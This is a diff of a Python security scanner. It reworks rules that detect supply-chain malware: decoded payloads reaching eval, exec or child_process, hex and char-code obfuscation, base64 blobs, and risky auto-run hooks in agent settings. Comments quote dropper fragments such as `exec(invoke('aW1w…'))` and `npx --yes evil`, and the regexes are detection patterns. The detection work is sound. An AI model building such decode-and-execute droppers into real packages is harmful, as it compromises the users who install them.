-    if len(nums) < 10:                                    # a code table has ten too
-        return None
-    tables = {m.group(1) for m in _CHARCODE_TABLE_RE.finditer(line)
-              if all(32 <= int(v) <= 126 for v in re.findall(r"[0-9]+", m.group(2)))}
-    refs = [m.start() for m in _CHARCODE_NAME_RE.finditer(line) if m.group() in tables] if tables else []
-    budget = CHARCODE_SCAN_BUDGET
-    for m in CHARCODE_RE.finditer(line):
-        t = _CHARCODE_CALL_TAIL_RE.match(line, m.end())
-        if t is None:
-            continue
-        k = t.end() - 1                                   # the '('
-        stop = min(len(line), k + CHARCODE_ARGS_MAX)
-        end = _call_args_end(line, k, stop) if budget > 0 else None
-        e = stop if end is None else end
-        budget -= e - k
-        if (bisect.bisect_left(nums, e) - bisect.bisect_left(nums, k) >= 10
-                or bisect.bisect_left(refs, e) > bisect.bisect_left(refs, k)):
-            return m.start()
-    return None
-
-
 def _paren_close_map(line):
     """{index of '(' : index of its matching ')'} for one line, in one pass.
     Quotes are tracked from the start of the line (a '(' inside a string
@@ -4454,26 +3939,6 @@ def sql_sink_analyzer(path, lines, issues, ctx=None):
             if build:
                 issues.append(_sql_issue(path, i + 1, lines, first, build))
 
-def _paren_slice(line, open_idx):
-    """Content of the balanced parenthesized group starting at open_idx (the
-    index of '('), or None if unbalanced."""
-    depth, quote = 0, None
-    for j in range(open_idx, len(line)):
-        ch = line[j]
-        if quote:
-            if ch == quote:
-                quote = None
-            continue
-        if ch in "\"'":
-            quote = ch
-        elif ch == "(":
-            depth += 1
-        elif ch == ")":
-            depth -= 1
-            if depth == 0:
-                return line[open_idx + 1:j]
-    return None
-
 def _sql_issue(path, line_no, lines, arg, build):
     how = {"percent": "%-interpolation", "format": ".format()/f-string",
            "concat": "concatenation"}.get(build, "string-building")
@@ -4485,6 +3950,7 @@ def _sql_issue(path, line_no, lines, arg, build):
          "ref": "CWE-89 · OWASP A03"},
         path, line_no, lines)
 
+
 # ---------------- Linear SQL *-NOWHERE scan (F11) ----------------
 # SQL-DELETE-NOWHERE / SQL-UPDATE-NOWHERE are fired by this linear pass, NOT
 # by the generic TEXT_RULES finditer (their entry regexes match only the
@@ -4495,7 +3961,6 @@ def _sql_issue(path, line_no, lines, arg, build):
 # WHERE check runs on the bounded statement slice only.
 _SQL_NOWHERE_RULES = {r["id"]: r for r in TEXT_RULES
                       if r["id"] in ("SQL-DELETE-NOWHERE", "SQL-UPDATE-NOWHERE")}
-_SQL_NOWHERE_SKIP = frozenset(_SQL_NOWHERE_RULES)
 _SQL_WHERE_RE = re.compile(r"\bWHERE\b", re.I)
 
 
@@ -4559,11 +4024,59 @@ def normalize_newlines(text):
 SCAN_TIME_BUDGET = 30.0
 
 
-def scan_file(path, content, lang, dep=False):
-    """Scan one file. dep=True → dependency mode: only supply-chain and
-    secret rules run (quality/bug rules would be pure noise in vendored code).
-    The text is read in Unicode 13.0 on every Python (see _unicode13): a code
-    point it leaves unassigned is scanned, and shown, as U+FFFD."""
+def scan_file_after_rules(path, content, lang, rules):
+    """scan_file in project mode with its first part already read: `rules`,
+    the findings scan_rules gives for the file (the native engine's,
+    engine.py), then the passes that follow them, the suppression markers
+    and the cap, as scan_file runs them."""
+    def scan(path, content, lines, lang, dep, ctx, issues):
+        issues.extend(rules)
+        _project_passes(path, content, lines, lang, ctx, issues)
+    return _scan_source(path, content, lang, False, scan)
+
+
+def _project_passes(path, content, lines, lang, ctx, issues):
+    """Project mode's passes after the rules part: SQL's *-NOWHERE scan, the
+    intra-file taint, Python's SQL sinks, function length and complexity."""
+    ctx.check_time()
+    if lang == "sql":
+        try:
+            scan_sql_nowhere(path, content, issues, lines)
+        except Exception:
+            pass
+    ctx.check_time()
+    issues.extend(taint_scan(path, lines, lang, ctx))
+    # G12: whole-argument SQL-sink analysis (Python only) — catches
+    # execute(sql % x) with no space after %, .format() on a template variable,
+    # and execute(name) where name was built by interpolation/concatenation.
+    if lang == "py":
+        try:
+            sql_sink_analyzer(path, lines, issues, ctx)
+        except _ScanBudgetExceeded:
+            raise
+        except Exception:
+            pass
+    ctx.check_time()
+    for fn in extract_functions(lines, lang):
+        if fn["len"] > FN_LEN_LIMIT:
+            issues.append(mk_issue(
+                {"id": "Q-FN-LONG", "name": "Function too long", "type": "SMELL", "sev": "MAJOR",
+                 "msg": f"Function \"{fn['name']}\" is {fn['len']} lines long (limit {FN_LEN_LIMIT}).",
+                 "why": "Long functions do too much and resist testing and reuse.",
+                 "fix": "Extract cohesive blocks into helper functions.",
+                 "ref": "Maintainability"}, path, fn["line"], lines))
+        if fn["cx"] > FN_CX_LIMIT:
+            issues.append(mk_issue(
+                {"id": "Q-FN-CX", "name": "High cyclomatic complexity", "type": "SMELL", "sev": "MAJOR",
+                 "msg": f"Function \"{fn['name']}\" has complexity ~{fn['cx']} (limit {FN_CX_LIMIT}).",
+                 "why": "Highly branched code is hard to reason about and to cover with tests.",
+                 "fix": "Split branches into smaller functions; use early returns or lookup tables.",
+                 "ref": "Maintainability"}, path, fn["line"], lines))
+
+
+def _scan_source(path, content, lang, dep, scan, finish=True):
+    """`scan` of one file as scan_file reads it, then, when `finish`,
+    without what a marker suppresses and capped."""
     lines = source_lines(_unicode13.pin(content), lang)
     content = "\n".join(lines)
     ctx = _FileCtx(lines, lang, content, time.monotonic() + SCAN_TIME_BUDGET, jsx_reading(path))
@@ -4572,9 +4085,11 @@ def scan_file(path, content, lang, dep=False):
     try:
         issues = []
         try:
-            _scan_file(path, content, lines, lang, dep, ctx, issues)
+            scan(path, content, lines, lang, dep, ctx, issues)
         except _ScanBudgetExceeded:
             issues.append(truncated_issue(path, "scan time budget exceeded"))
+        if not finish:
+            return issues
         return cap_issues(path, [i for i in issues if not ctx.suppressed(i, dep=dep)], lines)
     finally:
         _TLS.ctx = outer
@@ -4638,11 +4153,12 @@ def _autorun_rule(sev, msg, why, fix):
 _AGENT_SETTINGS_REASON = "writes an AI agent's or editor's auto-run settings"
 
 
-def _autorun_script_risk(text):
+def _autorun_script_risk(text, lang=None):
     """install_script_risk for what a settings file runs, but for writing an
     agent's or editor's settings: an agent's own hooks manage them (a
-    WorktreeCreate hook copies settings.local.json into the new worktree)."""
-    return [r for r in install_script_risk(text) if not r.startswith(_AGENT_SETTINGS_REASON)]
+    WorktreeCreate hook copies settings.local.json into the new worktree).
+    `lang`: a script's language, when known."""
+    return [r for r in install_script_risk(text, lang=lang) if not r.startswith(_AGENT_SETTINGS_REASON)]
 
 
 def _autorun_risk(command, base, read):
@@ -4661,11 +4177,19 @@ def _autorun_risk(command, base, read):
         text = read(rel) if rel is not None else None
         if text is None:
             continue
-        found = _autorun_script_risk(text)
+        found = _autorun_script_risk(text, engine.script_lang(rel))
         if len(set(OBF_IDENT_RE.findall(text))) >= 5:
             found.append("is obfuscated")
         if found:
             return found, target
+        # (0.1.8) the scripts it starts (spawned_scripts): a loader that fetches
+        # a runtime and runs a file of the tree with it
+        for where, path in spawned_scripts(normalize_newlines(text), engine.script_lang(rel)):
+            srel = _tree_join(posixpath.dirname(rel) if where == "dir" else base, path)
+            stext = read(srel) if srel is not None else None
+            more = _autorun_script_risk(stext, engine.script_lang(srel)) if stext else []
+            if more:
+                return [f"starts {srel}, which {'; and '.join(more)}"], target
     return [], None
 
 
@@ -4807,462 +4331,7 @@ def scan_config_file(path, content, read=None):
         _TLS.ctx = outer
 
 
-# Rules that also run on comment lines.
-_COMMENT_LINE_RULES = frozenset(("Q-TODO", "S-TOKEN", "S-BIDI"))
-
-# ---------------- Decode -> execute across lines (review fix, shared semantics 13) ----------------
-# SC-EVAL-DECODE is matched per line, so `eval(\n  atob(…))` and
-# `exec(  # nosec\n  base64.b64decode(…))` (the second also dodging the
-# "SC-* is unsuppressible" rule by never producing a finding) were missed.
-# When a line names a sink and leaves parentheses open (or ends with the
-# sink's name), it is joined — comment text removed — with up to
-# SC_JOIN_MAX_LINES following lines until the parentheses balance, and the
-# rule is matched on the joined statement. A match must begin on the first
-# line; the finding is reported there.
-SC_JOIN_MAX_LINES = 8
-SC_JOIN_MAX_CHARS = 4000        # of following-line text added to one join
-_SC_SINK_NAMES = ("eval", "exec", "execSync", "Function",
-                  "runInContext", "runInThisContext", "runInNewContext")
-_SC_SINK_WORD_RE = re.compile(r"\b(?:eval|exec|execSync|Function|runIn(?:This|New)?Context)\b|" + _EVAL_BY_NAME)
-
-
-def _paren_balance(code):
-    t = STRING_LIT_RE.sub("", code)
-    return t.count("(") - t.count(")")
-
-
-def _joined_eval_decode(ctx, i, rule_re):
-    """Column (on line i) of an SC-EVAL-DECODE match over the statement that
-    starts on line i and continues on the next lines, or None."""
-    code = ctx.mcode(i)
-    if not _SC_SINK_WORD_RE.search(code):
-        return None
-    depth = _paren_balance(code)
-    if depth <= 0 and not code.rstrip().endswith(_SC_SINK_NAMES):
-        return None
-    parts, added = [code], 0
-    for k in range(i + 1, min(len(ctx.lines), i + 1 + SC_JOIN_MAX_LINES)):
-        if ctx.cmask[k]:
-            continue
-        nxt = ctx.mcode(k)
-        parts.append(nxt)
-        added += len(nxt)
-        depth += _paren_balance(nxt)
-        if (depth <= 0 and nxt.strip()) or added > SC_JOIN_MAX_CHARS:
-            break
-    m = rule_re.search(" ".join(parts))
-    return m.start() if m and m.start() < len(code) else None
-
-
-# Dependency mode also follows a decoded value through variables: a name
-# assigned from a decode call (atob, Buffer.from(…, 'base64'), b64decode,
-# bytes.fromhex, codecs.decode, unhexlify, zlib.decompress — member prefixes
-# allowed), or from an expression naming such a variable, that later appears
-# in the arguments of eval / exec / execSync / execFile(Sync) / spawn(Sync) /
-# Function / new Function / vm.runIn*Context is SC-EVAL-DECODE at the sink.
-# Statements on one line are processed left to right (`const d = atob(p);
-# eval(d)`). Names are never un-tainted (over-approximation is the safe
-# direction for third-party code). Project mode covers this with T-CODE/T-CMD.
-# A decode call written directly in a sink's arguments counts too
-# (`cp.exec(atob(p))`, which the per-line rule no longer sees for aliases).
-#
-# `exec` and `eval` are sinks when called bare (`exec(d)`, JavaScript names
-# imported from child_process), on a global object (`window.eval`,
-# `globalThis.eval`), on Python's builtins, or on child_process itself, a
-# require("child_process") call or a name assigned from one. Any other
-# method call is not code execution: `re.exec(t)` / `/…/.exec(t)` is
-# RegExp.prototype.exec (the `for (re.lastIndex = 0; (m = re.exec(t));)`
-# loop of every bundler's output), `session.exec(q)` a database call. The
-# other sink names are distinctive and count on any receiver.
-_DECODE_CALL_SRC = (
-    r"(?:\batob|\bb64decode|\.\s*fromhex|\bunhexlify|\b" + _module_ref("codecs") + r"\s*\.\s*decode"
-    r"|\b" + _module_ref("zlib") + r"\s*\.\s*decompress|\.\s*decrypt)\s*\("
-    r"|\bBuffer\s*\.\s*from\s*\([^;\n]{0,300}?['\"`]base64['\"`]")
-_DECODE_CALL_RE = re.compile(_DECODE_CALL_SRC)
-# A decoder imported under another name, whose calls decode too: `from base64
-# import b64decode as invoke` then `exec(invoke('aW1w…'))` hid a payload from
-# the decode flow in two malicious PyPI packages. (`.decrypt(` — a Fernet or
-# AES cipher's — is a decode call of its own: `exec(Fernet(k).decrypt(t))`.)
-_DECODER_IMPORT_RE = re.compile(
-    r"^[ \t]*from[ \t]+(?:base64|binascii|codecs|zlib|marshal|bz2|lzma|gzip)[ \t]+import[ \t]+([^\n#]{1,300})", re.M)
-_DECODER_NAMES = frozenset((
-    "b64decode", "b32decode", "b85decode", "a85decode", "decodebytes", "standard_b64decode", "urlsafe_b64decode",
-    "unhexlify", "a2b_base64", "a2b_hex", "decode", "decompress", "loads"))
-_PLAIN_NAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
-
-
-def _decoder_aliases(text):
-    """Names a Python file binds to a decoder with `from … import d as name`."""
-    out = []
-    if "import" not in text or " as " not in text:
-        return out
-    for m in _DECODER_IMPORT_RE.finditer(text):
-        for part in m.group(1).replace("(", " ").replace(")", " ").split(","):
-            bits = part.split()
-            if (len(bits) == 3 and bits[1] == "as" and bits[0] in _DECODER_NAMES
-                    and _PLAIN_NAME_RE.match(bits[2]) and bits[2] not in out):
-                out.append(bits[2])
-    return out[:20]
-
-
-def _file_decode_re(content):
-    """_DECODE_CALL_RE, with the calls of the file's decoder aliases."""
-    aliases = _decoder_aliases(content)
-    if not aliases:
-        return _DECODE_CALL_RE
-    return re.compile(_DECODE_CALL_SRC + r"|(?<![\w.])(?:" + "|".join(aliases) + r")\s*\(")
-# The receiver starts at an identifier boundary: without (?<![\w$]) every
-# position inside a long identifier retried the whole rest of it ('a' * 20,000
-# on one line: 4.8 s).
-_DECODE_SINK_RE = re.compile(
-    r"(?:(?<![\w$])(require\s*\(\s*['\"`][ \w:]*['\"`]\s*\)|[A-Za-z_$][\w$]*)\s*\.\s*)?"
-    r"(?<![\w$])(eval|exec|execSync|execFile|execFileSync|spawn|spawnSync|Function"
-    r"|runIn(?:This|New)?Context)\s*\(")
-_GLOBAL_EVAL_RECEIVERS = frozenset(("window", "globalThis", "self", "global", "top", "parent",
-                                    "frames", "builtins", "__builtins__"))
-# The indirect calls of eval / Function (_INDIRECT_EVAL) as sinks of the
-# flow: each match ends at the call's '(' (a thisArg in the arguments names
-# no decoded value). Matched on the line as written, since a computed
-# member's name is a string literal; a match must start outside one.
-_INDIRECT_SINK_RE = re.compile(
-    r"\(\s*(?:void\s+)?[\w$.]+\s*,\s*" + _GLOBAL_OBJECT + r"(?:eval|Function)\s*\)\s*\("
-    r"|\b(?:eval|Function)\s*\.\s*(?:call|apply)\s*\("
-    r"|\b(?:eval|Function)\s*\.\s*bind\s*\([^()]*\)\s*\("
-    r"|\bReflect\s*\.\s*apply\s*\((?=\s*" + _GLOBAL_OBJECT + r"(?:eval|Function)\s*,)"
-    r"|" + _EVAL_BY_NAME + r"\s*\(")
-_CHILD_PROCESS_RE = re.compile(r"['\"`](?:node:)?child_process['\"`]")
-_CP_ALIAS_RE = re.compile(
-    r"(?<![\w$.])([A-Za-z_$][\w$]*)\s*=\s*(?:await\s+)?(?:require|import)\s*\(\s*"
-    r"['\"`](?:node:)?child_process['\"`]\s*\)"
-    r"|\bimport\s+(?:\*\s*as\s+)?([A-Za-z_$][\w$]*)\s+from\s*['\"`](?:node:)?child_process['\"`]")
-
-
-def _child_process_aliases(content):
-    """Names bound to the child_process module in this file."""
-    if "child_process" not in content:
-        return frozenset()
-    return frozenset(m.group(1) or m.group(2) for m in _CP_ALIAS_RE.finditer(content))
-
-
-def _is_code_sink(code, m, cp_aliases):
-    """Is this _DECODE_SINK_RE match (found in the string-blanked text of
-    `code`) a call that runs code? See the comment above _DECODE_CALL_RE."""
-    name = m.group(2)
-    if name not in ("eval", "exec"):
-        return True
-    if m.group(1) is None:
-        j = m.start(2) - 1
-        while j >= 0 and code[j] in " \t":
-            j -= 1
-        return j < 0 or code[j] != "."        # `foo().exec(` / `/re/.exec(`: a method
-    recv = code[m.start(1):m.end(1)]
-    if recv.startswith("require"):
-        return name == "exec" and _CHILD_PROCESS_RE.search(recv) is not None
-    if recv in _GLOBAL_EVAL_RECEIVERS:
-        return name == "eval" or recv in ("builtins", "__builtins__")
-    return name == "exec" and (recv == "child_process" or recv in cp_aliases)
-_DEP_ASSIGN_RE = re.compile(r"(?<![\w$])([A-Za-z_$][\w$]*)\s*=(?![=>])([^;]*)")
-DEP_SINK_ARGS_MAX = 1000        # chars of a sink's arguments searched for decoded names
-
-
-def _blank_strings(code):
-    """`code` with the contents of its string literals replaced by spaces
-    (same length, quotes kept) so identifiers inside strings do not count."""
-    return STRING_LIT_RE.sub(lambda m: m.group()[0] + " " * (len(m.group()) - 2) + m.group()[-1],
-                             code)
-
-
-# A decoded value taints names for DEP_FLOW_WINDOW characters from the
-# decode (a dropper decodes and runs its payload together). Names are
-# tracked without scopes, so without a bound one ordinary decode in a large
-# bundle spread through helper parameters to thousands of names: npm:pullfrog's
-# 7.8 MB dist/index.js loads undici's WebAssembly parser with
-# `mod = …compile(Buffer.from(…, "base64"))` at line 7310, and esbuild's
-# `__importStar(mod)` helper carried the mark to 6,216 names, every spawn in
-# the file among them.
-DEP_FLOW_WINDOW = 10_000
-# `function exec(`, `function* exec(`, `def exec(`: a definition (on the 24 chars before the name)
-_FN_DEF_BEFORE_RE = re.compile(r"(?:^|[^\w$])(?:function\s*\*?|def)\s*$")
-
-
-def _dep_decode_flow(path, ctx, issues):
-    rule = next(r for r in RULES if r["id"] == "SC-EVAL-DECODE")
-    ident_re = _IDENT_RUN_RE.get(ctx.lang, _IDENT_RUN_RE["js"])
-    have = {i["line"] for i in issues if i["rule"] == "SC-EVAL-DECODE"}
-    cp_aliases = _child_process_aliases(ctx.content) if ctx.lang == "js" else frozenset()
-    decoded = {}                      # name -> (line of the decode, its offset in the file)
-    offset = 0                        # offset of line i in the file
-    decode_re = _file_decode_re(ctx.content) if ctx.lang == "py" else _DECODE_CALL_RE
-    for i in range(len(ctx.lines)):
-        base, offset = offset, offset + len(ctx.lines[i]) + 1
-        if ctx.cmask[i]:
-            continue
-        code = ctx.mcode(i)
-        if not code or code.isspace():
-            continue
-        if not i & 63:
-            ctx.check_time()
-        has_decode = decode_re.search(code) is not None
-        if not decoded and not has_decode:
-            continue
-        blank = _blank_strings(code)
-        events = [(m.start(), 0, m) for m in _DEP_ASSIGN_RE.finditer(blank)]
-        events += [(m.start(), 1, m) for m in _DECODE_SINK_RE.finditer(blank)]
-        events += [(m.start(), 2, m) for m in _INDIRECT_SINK_RE.finditer(code)
-                   if blank[m.start()] == code[m.start()]]
-        events.sort(key=lambda e: (e[0], e[1]))
-        close = None
-
-        def live(a, b, at):
-            """Decodes behind the decoded names in blank[a:b], still in reach at `at`."""
-            return [decoded[v] for v in set(ident_re.findall(blank, a, b))
-                    if v in decoded and at - decoded[v][1] <= DEP_FLOW_WINDOW]
-
-        for n, (pos, kind, m) in enumerate(events):
-            if n and not n & 255:     # one long line can hold thousands of statements
-                ctx.check_time()
-            at = base + pos
-            if kind == 0:
-                a, b = m.span(2)
-                if decode_re.search(code, a, b):
-                    decoded[m.group(1)] = (i + 1, at)
-                    continue
-                src = live(a, b, at)
-                if src:
-                    decoded[m.group(1)] = max(src, key=lambda d: d[1])
-                continue
-            if i + 1 in have:
-                continue
-            if kind == 1:
-                if not _is_code_sink(code, m, cp_aliases):
-                    continue
-                if _FN_DEF_BEFORE_RE.search(blank[max(0, m.start(2) - 24):m.start(2)]):
-                    continue                  # a definition, not a call
-            if close is None:
-                close = _paren_close_map(blank)
-            closed = close.get(m.end() - 1)
-            if closed is not None and blank[closed + 1:closed + 2 + DEP_SINK_ARGS_MAX].lstrip()[:1] == "{":
-                continue                      # `exec(a, b) {`: a method definition
-            end = min(len(blank) if closed is None else closed, m.end() + DEP_SINK_ARGS_MAX)
-            src = live(m.end(), end, at)
-            if src:
-                msg = (f"Decoded payload (assigned at line {min(d[0] for d in src)}) "
-                       f"reaches a code-execution sink.")
-            elif decode_re.search(code, m.end(), end):
-                msg = "Decoded payload reaches a code-execution sink in the same call."
-            else:
-                continue
-            have.add(i + 1)
-            issues.append(mk_issue(dict(rule, msg=msg), path, i + 1, ctx.lines, m.start()))
-
-
-def _scan_file(path, content, lines, lang, dep, ctx, issues):
-    cmask, mlines = ctx.cmask, ctx.mlines
-    rules = [r for r in RULES if lang in r["langs"]
-             and (not dep or r["id"].startswith(DEP_RULE_PREFIXES))]
-    secret_lines = set()          # lines with S-TOKEN / S-SECRET (S-ENTROPY dedupe)
-    file_words = []               # the file's ASCII words, read when a look-alike name needs them
-
-    def words():
-        if not file_words:
-            file_words.append(frozenset(_ASCII_WORD_RE.findall(content)))
-        return file_words[0]
-    runs_code = []                # whether the file runs code from a string (SC-HIDDEN-UNICODE severity)
-
-    def file_runs_code():
-        if not runs_code:
-            runs_code.append(_HIDDEN_EXEC_RE.search(content) is not None)
-        return runs_code[0]
-    for i, line in enumerate(lines):
-        ctx.check_time()
-        if not line or line.isspace():
-            # no rule or heuristic matches whitespace alone; only the length rule applies
-            if not dep and len(line) > LONG_LINE:
-                issues.append(mk_issue(
-                    {"id": "Q-LONGLINE", "name": "Line too long", "type": "SMELL", "sev": "MINOR",
-                     "msg": f"Line exceeds {LONG_LINE} characters.",
-                     "why": "Very long lines hurt readability and reviews.",
-                     "fix": "Break the line up for readability.", "ref": "Maintainability"},
-                    path, i + 1, lines))
-            continue
-        mline = mlines[i]
-        for r in rules:
-            if cmask[i] and r["id"] not in _COMMENT_LINE_RULES:
-                continue
-            # equality checks shouldn't match inside string literals
-            target = STRING_LIT_RE.sub("\"\"", mline) if r["id"] == "B-EQEQ" else mline
-            m = r["re"].search(target)
-            col = m.start() if m else None
-            if col is None and r["id"] == "SC-EVAL-DECODE" and not cmask[i]:
-                col = _joined_eval_decode(ctx, i, r["re"])
-            if col is None:
-                continue
-            if r["need"] and not r["need"].search(mline):
-                continue
-            if r["skip"] and r["skip"].search(mline):
-                continue
-            if r["id"] == "S-TOKEN" and not _token_has_material(r["re"], mline, mlines, i):
-                continue
-            if r["id"] in ("S-TOKEN", "S-SECRET"):
-                secret_lines.add(i)
-            issues.append(mk_issue(r, path, i + 1, lines, col))
-        if not dep and len(line) > LONG_LINE:
-            issues.append(mk_issue(
-                {"id": "Q-LONGLINE", "name": "Line too long", "type": "SMELL", "sev": "MINOR",
-                 "msg": f"Line exceeds {LONG_LINE} characters.",
-                 "why": "Very long lines hurt readability and reviews.",
-                 "fix": "Break the line up for readability.", "ref": "Maintainability"},
-                path, i + 1, lines))
-        # --- obfuscation heuristics (strong supply-chain indicators) ---
-        hidden = hex_hidden_text(line)
-        if hidden is not None:
-            dangerous = bool(HIDDEN_TEXT_DANGER_RE.search(hidden))
-            preview = hidden if len(hidden) <= 60 else hidden[:57] + "..."
-            issues.append(mk_issue(
-                {"id": "SC-HEXSTR", "name": "Hex-escaped readable text", "type": "HOTSPOT",
-                 "sev": "CRITICAL" if dangerous else "MAJOR",
-                 "msg": f"Hex escapes hide readable text: {preview!r}.",
-                 "why": ("Escaping ordinary printable characters serves no purpose except hiding "
-                         "them from review and search; this text "
-                         + ("names code execution, a download, or a URL." if dangerous
-                            else "is readable once decoded.")),
-                 "fix": "Decode the string and review what it does.",
-                 "ref": "CWE-506 · Supply chain"}, path, i + 1, lines,
-                _HEX_ESCAPE_RE.search(line).start()))
-        else:
-            name = hex_hidden_name(line)
-            if name is not None:
-                issues.append(mk_issue(
-                    {"id": "SC-HEXSTR", "name": "Hex-escaped readable text", "type": "HOTSPOT",
-                     "sev": "CRITICAL", "msg": f"Escape sequences hide a name: {name[0]!r}.",
-                     "why": ("Nothing needs to escape a letter of a name like this one: writing it as "
-                             "escape sequences only hides it from review and search, and this one "
-                             "names code execution, a download, or a URL."),
-                     "fix": "Decode the string and review what it does.",
-                     "ref": "CWE-506 · Supply chain"}, path, i + 1, lines, name[1]))
-        if lang in ("js", "py") and not cmask[i]:
-            code = ctx.mcode(i)
-            if not code.isascii():
-                found = lookalike_name(ctx.names_code(i), lang, words)
-                if found is not None:
-                    issues.append(lookalike_issue(found, path, i + 1, lines))
-            if not dep and _runs_download_through_shell(code):
-                issues.append(mk_issue(_PIPE_SHELL_RULE, path, i + 1, lines, _EXEC_CALL_RE.search(code).start()))
-        if not line.isascii():
-            hrun = hidden_unicode_run(line)
-            if hrun is not None:
-                issues.append(_hidden_unicode_issue(path, i + 1, lines, hrun[0], hrun[1], file_runs_code()))
-        cm_col = _charcode_col(line) if lang == "js" else None
-        if cm_col is not None:
-            issues.append(mk_issue(
-                {"id": "SC-CHARCODE", "name": "Char-code string building", "type": "HOTSPOT", "sev": "MAJOR",
-                 "msg": "String assembled from character codes — obfuscation indicator.",
-                 "why": "fromCharCode chains hide payloads from static review.",
-                 "fix": "Decode and review what string is being built.",
-                 "ref": "CWE-506 · Supply chain"}, path, i + 1, lines, cm_col))
-        bm = B64_BLOB_RE.search(line)
-        if bm and "sourceMappingURL" not in line:
-            issues.append(mk_issue(
-                {"id": "SC-B64", "name": "Large base64 blob", "type": "HOTSPOT", "sev": "MAJOR",
-                 "msg": "Base64 blob (200+ chars) embedded in code.",
-                 "why": "Embedded encoded blobs can carry second-stage payloads.",
-                 "fix": "Decode and verify the content; move legitimate assets to data files.",
-                 "ref": "CWE-506 · Supply chain"}, path, i + 1, lines, bm.start()))
-        if lang in ("js", "py"):
-            off = offscreen_code(line, lang)
-            if off is not None and ctx.names_code(i).strip():
-                issues.append(_offscreen_issue(path, i + 1, lines, off))
-        # --- entropy-based secret detection ---
-        # (review fix: the S-TOKEN/S-SECRET dedupe was an any() over every
-        # issue so far, per line — 15.7 s on 20k lines; now a set lookup)
-        if not cmask[i] and i not in secret_lines and not SECRET_SKIP_RE.search(line):
-            em = ENTROPY_VALUE_RE.search(line)
-            # the file's literal index holds exactly the entropy_secretish()
-            # literals of non-skip lines — computed once, shared with redaction
-            if em and em.group(1) in ctx.secrets().lits:
-                issues.append(mk_issue(
-                    {"id": "S-ENTROPY", "name": "High-entropy string", "type": "HOTSPOT", "sev": "MAJOR",
-                     "msg": "High-entropy string literal — possible hardcoded secret.",
-                     "why": "Random-looking constants are usually keys or tokens.",
-                     "fix": "If it is a secret, rotate it and load it from the environment.",
-                     "ref": "CWE-798 · OWASP A07"}, path, i + 1, lines, em.start(1)))
-    # file-level: javascript-obfuscator identifier signature
-    if lang == "js":
-        obf = OBF_IDENT_RE.findall(content)
-        if len(set(obf)) >= 5:
-            first_off = content.find(obf[0])
-            first_line = content[:first_off].count("\n") + 1
-            issues.append(mk_issue(
-                {"id": "SC-OBF-IDENT", "name": "Obfuscated identifier pattern", "type": "HOTSPOT",
-                 "sev": "CRITICAL",
-                 "msg": f"{len(set(obf))} '_0x…' identifiers — javascript-obfuscator signature.",
-                 "why": "This naming pattern is produced by obfuscation tools; in a dependency it is "
-                        "a classic indicator of a compromised or malicious package.",
-                 "fix": "Diff against the package's published repository; consider removing the dependency.",
-                 "ref": "CWE-506 · Supply chain"}, path, first_line, lines,
-                first_off - content.rfind("\n", 0, first_off) - 1))
-    if lang in ("js", "py"):
-        at = self_publish_at(content)
-        if at >= 0:
-            issues.append(mk_issue(_SELF_PUBLISH_RULE, path, content.count("\n", 0, at) + 1, lines,
-                                   at - content.rfind("\n", 0, at) - 1))
-    if dep:
-        _dep_decode_flow(path, ctx, issues)
-        return
-    mcontent = content if mlines is lines else "\n".join(mlines)
-    starts = None
-    for r in TEXT_RULES:
-        # *-NOWHERE SQL rules are fired by scan_sql_nowhere() (linear pass),
-        # not here — their regexes match only the statement head.
-        if lang not in r["langs"] or r["id"] in _SQL_NOWHERE_SKIP:
-            continue
-        last = None
-        for n, m in enumerate(r["re"].finditer(mcontent)):
-            if not n & 255:           # the time backstop also holds inside one rule
-                ctx.check_time()
-            if starts is None:        # review fix: was content[:pos].count("\n") per match
-                starts = _line_starts(mcontent)
-            line_no = bisect.bisect_right(starts, m.start())
-            if line_no == last:       # same (rule, line, msg): reported once (cap_issues)
-                continue
-            last = line_no
-            issues.append(mk_issue(r, path, line_no, lines, m.start() - starts[line_no - 1]))
-    ctx.check_time()
-    if lang == "sql":
-        try:
-            scan_sql_nowhere(path, content, issues, lines)
-        except Exception:
-            pass
-    ctx.check_time()
-    issues.extend(taint_scan(path, lines, lang, ctx))
-    # G12: whole-argument SQL-sink analysis (Python only) — catches
-    # execute(sql % x) with no space after %, .format() on a template variable,
-    # and execute(name) where name was built by interpolation/concatenation.
-    # (Project mode only, like every non-supply-chain rule; it used to run
-    # in dependency mode too, unlike the JS engine.)
-    if lang == "py":
-        try:
-            sql_sink_analyzer(path, lines, issues, ctx)
-        except _ScanBudgetExceeded:
-            raise
-        except Exception:
-            pass
-    ctx.check_time()
-    for fn in extract_functions(lines, lang):
-        if fn["len"] > FN_LEN_LIMIT:
-            issues.append(mk_issue(
-                {"id": "Q-FN-LONG", "name": "Function too long", "type": "SMELL", "sev": "MAJOR",
-                 "msg": f"Function \"{fn['name']}\" is {fn['len']} lines long (limit {FN_LEN_LIMIT}).",
-                 "why": "Long functions do too much and resist testing and reuse.",
-                 "fix": "Extract cohesive blocks into helper functions.",
-                 "ref": "Maintainability"}, path, fn["line"], lines))
-        if fn["cx"] > FN_CX_LIMIT:
-            issues.append(mk_issue(
-                {"id": "Q-FN-CX", "name": "High cyclomatic complexity", "type": "SMELL", "sev": "MAJOR",
-                 "msg": f"Function \"{fn['name']}\" has complexity ~{fn['cx']} (limit {FN_CX_LIMIT}).",
-                 "why": "Highly branched code is hard to reason about and to cover with tests.",
-                 "fix": "Split branches into smaller functions; use early returns or lookup tables.",
-                 "ref": "Maintainability"}, path, fn["line"], lines))
+# ---------------- The per-line pass's findings ----------------
 
 DEP_MARKERS = {"node_modules", "site-packages", "bower_components", "vendor",
                "venv", ".venv"}
@@ -5272,7 +4341,8 @@ INSTALL_HOOK_RE = re.compile(
 # (`npx --yes evil`, `node ./scripts/payload.js`, `git clone … && make` contain
 # none of those tokens). Presence of *any* install-time script is itself worth
 # a finding: it runs with user privileges on `npm install` before the package
-# is reviewed. The pattern list is only a severity escalator.
+# is reviewed. Since 0.1.8 the list is only a hint in that MAJOR finding's
+# message; what escalates a hook is what its command does (hook_command_risk).
 # Scripts npm runs when a package is installed as a dependency. Publisher-side
 # scripts (prepack, prepublishOnly, postpublish, ...) only ever run on the
 # maintainer's machine while packaging a release, so they are not install hooks.
@@ -5281,18 +4351,21 @@ NPM_INSTALL_SCRIPTS = ("preinstall", "install", "postinstall")
 # the prepare family (preprepare, prepare, postprepare).
 NPM_PREPARE_SCRIPTS = ("preprepare", "prepare", "postprepare")
 NPM_LOCAL_INSTALL_SCRIPTS = NPM_INSTALL_SCRIPTS + NPM_PREPARE_SCRIPTS
